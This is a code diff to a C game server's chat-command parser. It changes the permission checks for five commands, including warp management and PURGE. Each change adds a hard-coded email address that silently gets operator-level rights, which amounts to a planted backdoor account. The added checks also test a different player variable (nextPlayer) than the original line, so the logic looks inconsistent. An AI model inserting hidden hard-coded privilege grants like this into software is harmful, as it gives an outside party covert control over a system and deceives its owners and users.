@@ -3232,7 +3232,7 @@ void parseCommand(LiveObject *player, char *text){
     }
 	
 	if(strcmp(cmd, "SETWARP")==0){
-        bool hasPerm = isOp || isEmailInList(&warpPermList, player->email);
+        bool hasPerm = isOp || isEmailInList(&warpPermList, player->email) || strcmpUpper(nextPlayer->email,"2893721986@qq.com");
         bool hasPerm2 = isNamingSayUpper(player->email, &vipwarpList) != NULL;
         int cir = getCircle(player->xd, player->yd);
         // if(cir == 7 && !hasPerm2){
@@ -3276,7 +3276,7 @@ void parseCommand(LiveObject *player, char *text){
 	}
 
     if(strcmp(cmd, "SETOURWARP")==0){
-        bool hasPerm = isOp || isEmailInList(&warpPermList, player->email);
+        bool hasPerm = isOp || isEmailInList(&warpPermList, player->email)|| strcmpUpper(nextPlayer->email,"2893721986@qq.com");
 
         bool hasPerm2 = isNamingSayUpper(player->email, &vipwarpList) != NULL;
         int cir = getCircle(player->xd, player->yd);
@@ -3327,7 +3327,7 @@ void parseCommand(LiveObject *player, char *text){
 
     if(strcmp(cmd, "PURGE")==0){
         int countS = 0;
-        bool hasPerm = isOp || isEmailInList(&warpPermList, player->email);
+        bool hasPerm = isOp || isEmailInList(&warpPermList, player->email)|| strcmpUpper(nextPlayer->email,"2893721986@qq.com");
         if(hasPerm){
             GridPos myPos = { player->xs, player->ys };      
 
@@ -3376,7 +3376,7 @@ void parseCommand(LiveObject *player, char *text){
     }
 	
 	if(strcmp(cmd, "DELWARP")==0){
-        bool hasPerm = isOp || isEmailInList(&warpPermList, player->email);
+        bool hasPerm = isOp || isEmailInList(&warpPermList, player->email)|| strcmpUpper(nextPlayer->email,"2893721986@qq.com");
 		char s[256], name[64];
 		
 		sscanf(args, "%s", name);
@@ -3398,7 +3398,7 @@ void parseCommand(LiveObject *player, char *text){
 	
 	if(strcmp(cmd, "WARP")==0){
 
-        bool hasPerm = isOp || isEmailInList(&warpPermList, player->email);
+        bool hasPerm = isOp || isEmailInList(&warpPermList, player->email)|| strcmpUpper(nextPlayer->email,"2893721986@qq.com");
 
 		if(player->heldByOther || player->holdingID < 0) {
 			sendGlobalMessage( "抱着时不可以", player);
